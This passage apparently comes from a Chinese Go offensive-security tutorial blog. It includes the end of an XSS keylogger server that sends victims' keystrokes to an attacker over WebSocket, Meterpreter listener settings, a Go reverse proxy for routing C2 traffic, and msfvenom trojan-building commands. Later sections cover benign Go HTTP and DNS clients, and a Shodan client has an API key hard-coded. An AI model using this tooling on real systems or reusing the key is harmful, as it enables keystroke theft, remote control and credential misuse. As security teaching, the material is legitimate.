class="string">&quot;From %s: %s\n&quot;</span>, conn.RemoteAddr().String(), <span class="type">string</span>(msg))</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveFile</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>) <span class="comment">//设置头为js解析</span></span><br><span class="line">   jsTemplate.Execute(w, wsAddr)                            <span class="comment">//把wsAddr(输入的地址)传入w</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter() <span class="comment">//创建路由</span></span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/ws&quot;</span>, serveWS)</span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/k.js&quot;</span>, serveFile)</span><br><span class="line">   log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>简单描述一下上面代码的执行过程描述一下：<ol><li>首先启动恶意服务器端程序，内置函数Init()会优先执行。进行命令行输入，初始化服务器端js模板jsTemplate。</li><li>构造恶意js代码通过xss传入。（其实就是用了个src外部解析）</li><li>恶意服务器端，对被害者网页通过路由解析<a href="http://ip:port/k.js时，触发服务器端的">http://ip:port/k.js时，触发服务器端的</a> r.HandleFunc(“&#x2F;k.js”, serveFile)。然后wsAddr会被写入w并执行模板</li><li>与此同时，由于上面执行了模板，所以服务器的logger.js被触发，安装了键盘记录器，并通过serveWS进行webSocket通信，将数据传送回攻击者服务器</li></ol></li></ul><h3 id="GO代理Meterpreter-多路命令与控制"><a href="#GO代理Meterpreter-多路命令与控制" class="headerlink" title="GO代理Meterpreter( 多路命令与控制)"></a>GO代理Meterpreter( 多路命令与控制)</h3><p>起两个MSF服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter_reverse_http</span><br><span class="line">set LHOST 192.168.1.17</span><br><span class="line">set LPORT 80</span><br><span class="line">set ReverseListenerBindAddress 192.168.1.17</span><br><span class="line">set ReverseListenerBindPort 10080</span><br><span class="line">exploit -j -z</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter_reverse_http</span><br><span class="line">set LHOST 192.168.1.17</span><br><span class="line">set LPORT 80</span><br><span class="line">set ReverseListenerBindAddress 192.168.1.17</span><br><span class="line">set ReverseListenerBindPort 20080</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   hostProxy = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)                 <span class="comment">//[主机名][MSF_URL]将主机名映射到MSF监听器的URL</span></span><br><span class="line">   proxies   = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*httputil.ReverseProxy) <span class="comment">//[主机名][*httputil.ReverseProxy实例]</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********初始化hostProxy和proxies************/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   hostProxy[<span class="string">&quot;attacker1.com&quot;</span>] = <span class="string">&quot;http://10.0.1.20:10080&quot;</span></span><br><span class="line">   hostProxy[<span class="string">&quot;attacker2.com&quot;</span>] = <span class="string">&quot;http://10.0.1.20:20080&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> k, v := <span class="keyword">range</span> hostProxy &#123; <span class="comment">//遍历hostProxy映射</span></span><br><span class="line">      remote, err := url.Parse(v) <span class="comment">//解析目标地址以创建Net.URL实例</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatal(<span class="string">&quot;Unable to parse proxy target&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      proxies[k] = httputil.NewSingleHostReverseProxy(remote) <span class="comment">//设置URL反向代理</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter() <span class="comment">//创建路由</span></span><br><span class="line">   <span class="keyword">for</span> host, proxy := <span class="keyword">range</span> proxies &#123;</span><br><span class="line">      r.Host(host).Handler(proxy) <span class="comment">//在每个主机名都添加了一个proxy</span></span><br><span class="line">   &#125;</span><br><span class="line">   log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们使用了net&#x2F;http&#x2F;httputil包，这个包可以帮助我们快速构建一个反向代理。然后我们来构建一对变量。这两个变量都是映射，我们使用第一个hostProxy将主机名映射到我们希望该主机名路由到的msf监听器url。然后第二个变量proxies也将使用主机名作为键值。但是，它们在映射中的对应值为实例*httputil.ReverseProxy，也就是说，这些值将是可以路由到实际的代理实例，而不是目标的字符串表示形式。</p><p>然后我们使用init()函数来进行域名和目标msf服务器之间的映射。我们将attacker1.com的路由请求到192.168.1.2服务器的10080端口，将attacker2.com的路由请求到192.168.1.2的20080端口。然后循环解析目标地址来创建net.URL，并且将其结果用作从URL创建反向代理函数的参数。而且该函数返回值httputil.ReverseProxy属于接口类型http.Handler，也就是说，我们可以利用它直接用阿里当作路由器的处理程序。</p><p>最后，我们在main函数中循环，将我们创建好的代理处理程序添加到路由中。而Gorilla MUX工具箱的Route类型包含一个名为Host的匹配函数，通过该函数，我们可以将传入的不同的host值的http请求调用不同的处理程序进行处理。</p><p>然后我们使用msf分别创建两个木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_http LHOST=192.168.1.17 LPORT=80 HttpHostHeader=attacker1.com -f exe -o payload1.exe</span><br><span class="line">msfvenom -p windows/meterpreter_reverse_http LHOST=192.168.1.17 LPORT=80 HttpHostHeader=attacker2.com -f exe -o payload2.exe</span><br></pre></td></tr></table></figure><p>由于我们实际在内网环境进行测试，并没有真实的使用域名，而我们编写的代理服务器，是将host头中的域名进行检测，来判断向那个msf服务器进行会话的发送，所以我们要在windows的host文件中将我们的attacker1.com、attacker2.com以及其对应的cs端口添加进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.17 attacker1.com</span><br><span class="line">192.168.1.17 attacker2.com</span><br></pre></td></tr></table></figure><p>运行之后就可以看到我们的木马已经上线。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201225159639.png" alt="image-20230201225159639"></p><p>当然这里只能上线一个</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230128143232789.png" alt="image-20230128143232789"></p><p>其实在cs中也是一样的道理，我们可以使用这种方法来保护我们的cs服务器真实ip。当然，我们之前说过的腾讯云函数上线也是这个道理，只不过云函数更进一步，会使用不同的网关进行上线。</p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.HTTP客户端以及与工具的远程交互</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/3.HTTP%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A5%E5%8F%8A%E4%B8%8E%E5%B7%A5%E5%85%B7%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/3.HTTP%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A5%E5%8F%8A%E4%B8%8E%E5%B7%A5%E5%85%B7%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<h4 id="HTTP-API"><a href="#HTTP-API" class="headerlink" title="HTTP API"></a>HTTP API</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get(url <span class="type">string</span>) (resp *Response, err <span class="type">error</span>)</span><br><span class="line">Head(url <span class="type">string</span>) (resp *Response, err <span class="type">error</span>)</span><br><span class="line">Post(url <span class="type">string</span>, bodyType <span class="type">string</span>, body io.Reader) (resp *Response, err <span class="type">error</span>) <span class="comment">//bodyType接收Content-Type HTTP标头</span></span><br><span class="line">PostForm(url <span class="type">string</span>, data url.Values) (resp *Response, err <span class="type">error</span>)</span><br></pre></td></tr></table></figure><h4 id="生成一个请求"><a href="#生成一个请求" class="headerlink" title="生成一个请求"></a>生成一个请求</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http.NewReques函数原型</span></span><br><span class="line">http.NewRequest(method, url <span class="type">string</span>, body io.Reader) (req *Request, err <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//for ex1: 一个没有HTTP正文的调用，即一个DELETE调用</span></span><br><span class="line">req, err := http.NewRequest(<span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;https://www.google.com/robots.txt&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line"><span class="comment">//for ex2: 一个PUT请求(类似PATCH请求)</span></span><br><span class="line">form := url.Values()</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">req, err := http.NewRequest(</span><br><span class="line">    <span class="string">&quot;PUT&quot;</span>, </span><br><span class="line">    <span class="string">&quot;https://www.google.com/robots.txt&quot;</span>,                strings.NewReader(form.Encode())</span><br><span class="line">)</span><br><span class="line">resp, err := client.Do(req) <span class="comment">//读取响应正文并关闭</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用结构化响应解析"><a href="#使用结构化响应解析" class="headerlink" title="使用结构化响应解析"></a>使用结构化响应解析</h4><h5 id="处理HTTP响应正文"><a href="#处理HTTP响应正文" class="headerlink" title="处理HTTP响应正文"></a>处理HTTP响应正文</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">resp, _ := http.Get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line">body, _ := ioutil.ReadAll(resp.Body)</span><br><span class="line">fmr.Println(<span class="type">string</span>(body))</span><br><span class="line">resp.Body.Close() <span class="comment">// Response类型包含一个可输出参数Body.其类型为io.ReadCloser</span></span><br></pre></td></tr></table></figure><h5 id="解码JSON响应正文"><a href="#解码JSON响应正文" class="headerlink" title="解码JSON响应正文"></a>解码JSON响应正文</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Status <span class="keyword">struct</span> &#123;</span><br><span class="line">   Message <span class="type">string</span></span><br><span class="line">   Status  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   res, err := http.Post(</span><br><span class="line">      <span class="string">&quot;http://127.0.0.1:3790/import&quot;</span>,</span><br><span class="line">      <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">      <span class="literal">nil</span>,</span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> status Status</span><br><span class="line">   <span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;status); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">   log.Printf(<span class="string">&quot;%s -&gt; %s\n&quot;</span>, status.Status, status.Message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构建与Shodan交互的HTTP客户端"><a href="#构建与Shodan交互的HTTP客户端" class="headerlink" title="构建与Shodan交互的HTTP客户端"></a>构建与Shodan交互的HTTP客户端</h4><h5 id="shodan-go"><a href="#shodan-go" class="headerlink" title="shodan.go"></a>shodan.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> BaseURL = <span class="string">&quot;https://api.shodan.io&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Client <span class="keyword">struct</span> &#123;</span><br><span class="line">   apiKey <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(apiKey <span class="type">string</span>)</span></span> *Client &#123;</span><br><span class="line">   <span class="keyword">return</span> &amp;Client&#123;apiKey: apiKey&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="api-go"><a href="#api-go" class="headerlink" title="api.go"></a>api.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> APIInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">   QueryCredits <span class="type">int</span>    <span class="string">`json:&quot;query_credits&quot;`</span></span><br><span class="line">   ScanCredits  <span class="type">int</span>    <span class="string">`json:&quot;scan_credits&quot;`</span></span><br><span class="line">   Telnet       <span class="type">bool</span>   <span class="string">`json:&quot;telnet&quot;`</span></span><br><span class="line">   Plan         <span class="type">string</span> <span class="string">`json:&quot;plan&quot;`</span></span><br><span class="line">   Https        <span class="type">bool</span>   <span class="string">`json:&quot;https&quot;`</span></span><br><span class="line">   Unlocked     <span class="type">bool</span>   <span class="string">`json:&quot;unlocked&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span> APIInfo() (*APIInfo, <span class="type">error</span>) &#123;</span><br><span class="line">   res, err := http.Get(fmt.Sprintf(<span class="string">&quot;%s/api-info?key=%s&quot;</span>, BaseURL, s.apiKey))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">   <span class="keyword">var</span> ret APIInfo <span class="comment">//返回内容</span></span><br><span class="line">   <span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="host-go"><a href="#host-go" class="headerlink" title="host.go"></a>host.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> HostLocation <span class="keyword">struct</span> &#123;</span><br><span class="line">   City         <span class="type">string</span>  <span class="string">`json:&quot;city&quot;`</span></span><br><span class="line">   RegionCode   <span class="type">string</span>  <span class="string">`json:&quot;region_code&quot;`</span></span><br><span class="line">   AreaCode     <span class="type">int</span>     <span class="string">`json:&quot;area_code&quot;`</span></span><br><span class="line">   Longitude    <span class="type">float32</span> <span class="string">`json:&quot;longitude&quot;`</span></span><br><span class="line">   CountryCode3 <span class="type">string</span>  <span class="string">`json:&quot;country_code3&quot;`</span></span><br><span class="line">   CountryName  <span class="type">string</span>  <span class="string">`json:&quot;country_name&quot;`</span></span><br><span class="line">   PostalCode   <span class="type">string</span>  <span class="string">`json:&quot;postal_code&quot;`</span></span><br><span class="line">   DMACode      <span class="type">int</span>     <span class="string">`json:&quot;dma_code&quot;`</span></span><br><span class="line">   CountryCode  <span class="type">string</span>  <span class="string">`json:&quot;country_code&quot;`</span></span><br><span class="line">   Latitude     <span class="type">float32</span> <span class="string">`json:&quot;latitude&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Host <span class="keyword">struct</span> &#123;</span><br><span class="line">   OS        <span class="type">string</span>       <span class="string">`json:&quot;os&quot;`</span></span><br><span class="line">   Timestamp <span class="type">string</span>       <span class="string">`json:&quot;timestamp&quot;`</span></span><br><span class="line">   ISP       <span class="type">string</span>       <span class="string">`json:&quot;isp&quot;`</span></span><br><span class="line">   ASN       <span class="type">string</span>       <span class="string">`json:&quot;asn&quot;`</span></span><br><span class="line">   Hostnames []<span class="type">string</span>     <span class="string">`json:&quot;hostnames&quot;`</span></span><br><span class="line">   Location  HostLocation <span class="string">`json:&quot;location&quot;`</span></span><br><span class="line">   IP        <span class="type">int64</span>        <span class="string">`json:&quot;ip&quot;`</span></span><br><span class="line">   Domains   []<span class="type">string</span>     <span class="string">`json:&quot;domains&quot;`</span></span><br><span class="line">   Org       <span class="type">string</span>       <span class="string">`json:&quot;org&quot;`</span></span><br><span class="line">   Data      <span class="type">string</span>       <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">   Port      <span class="type">int</span>          <span class="string">`json:&quot;port&quot;`</span></span><br><span class="line">   IPString  <span class="type">string</span>       <span class="string">`json:&quot;ip_str&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HostSearch <span class="keyword">struct</span> &#123;</span><br><span class="line">   Matches []Host <span class="string">`json:&quot;matches&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span> HostSearch(q <span class="type">string</span>) (*HostSearch, <span class="type">error</span>) &#123;</span><br><span class="line">   res, err := http.Get(</span><br><span class="line">      fmt.Sprintf(<span class="string">&quot;%s/shodan/host/search?key=%s&amp;query=%s&quot;</span>, BaseURL, s.apiKey, q), <span class="comment">//shodan的查询接口</span></span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> ret HostSearch</span><br><span class="line">   <span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> &amp;ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">2</span> &#123;</span><br><span class="line">      log.Fatalln(<span class="string">&quot;Usage: main &lt;searchterm&gt;&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//apiKey := os.Getenv(&quot;SHODAN_API_KEY&quot;)</span></span><br><span class="line">   apiKey := <span class="string">&quot;YQchKbHxjEgzXUqoR1qbtxec79P23owU&quot;</span></span><br><span class="line">   s := shodan.New(apiKey)  <span class="comment">//新建key</span></span><br><span class="line">   info, err := s.APIInfo() <span class="comment">//API信息</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(</span><br><span class="line">      <span class="string">&quot;Query Credits: %d\nScan Credits:  %d\n\n&quot;</span>,</span><br><span class="line">      info.QueryCredits,</span><br><span class="line">      info.ScanCredits)</span><br><span class="line"></span><br><span class="line">   hostSearch, err := s.HostSearch(os.Args[<span class="number">1</span>]) <span class="comment">//根据命令行第二个参数去查找含有该字符串的主机</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, host := <span class="keyword">range</span> hostSearch.Matches &#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;%18s:%d\n&quot;</span>, host.IPString, host.Port)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.1DNS利用之客户端</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/5.1DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/5.1DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="检索A记录"><a href="#检索A记录" class="headerlink" title="检索A记录"></a>检索A记录</h4><ul><li><p>首先我们来解析DNS中的A记录，该记录了域名对应的IP地址，在我们的子域名爆破中，我们只需要查看该域名是否能解析到IP地址，如果能解析到，则说明存在该子域名，反之则不存在。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg                    <span class="comment">//创建一个新的msg</span></span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;stacktitan.com&quot;</span>) <span class="comment">//调用Fqdn()将域转换为可以与DNS服务器交换的FQDN</span></span><br><span class="line">msg.SetQuestion(fqdn, dns.TypeA)   <span class="comment">//msf存放查找A记录的意图</span></span><br><span class="line">dns.Exchange(&amp;msg, <span class="string">&quot;8.8.8.8:53&quot;</span>)   <span class="comment">//将信息发送到提供的服务器地址(该地址是Google的DNS服务器)</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129120401553-1675263773785.png" alt="image-20230129120401553"></p><ul><li><p>tcpdump</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i en0 -n udp port 53</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129120622414-1675263773786.png" alt="image-20230129120622414"></p><h4 id="使用Msg结构体处理应答"><a href="#使用Msg结构体处理应答" class="headerlink" title="使用Msg结构体处理应答"></a>使用Msg结构体处理应答</h4><ul><li><p>dns.Exchange(&amp;msg, “8.8.8.8:53”)为什么返回*msg类型</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129123151998-1675263773786.png" alt="image-20230129123151998"></p><ul><li><p>可以看下图中Msg结构体的构成，包含了DNS问询及其应答。这样我们就可以用一个统一的结构体解决通信的问题。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129123615220-1675263773786.png" alt="image-20230129123615220"></p></li></ul></li><li><p>在刚刚的代码基础上增加了应答</p><ol><li>首先接受DNS服务器的响应结果，然后检查是否存在错误</li><li>然后确认切片Answer的长度至少为1，如果不是1，则说明记录没有立即返回，因为在某些情况下会存在域名无法解析的情况</li><li>处理应答，并检查断言(理解为其他的语言的类型转换)</li></ol></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> msg dns.Msg</span><br><span class="line">   fqdn := dns.Fqdn(<span 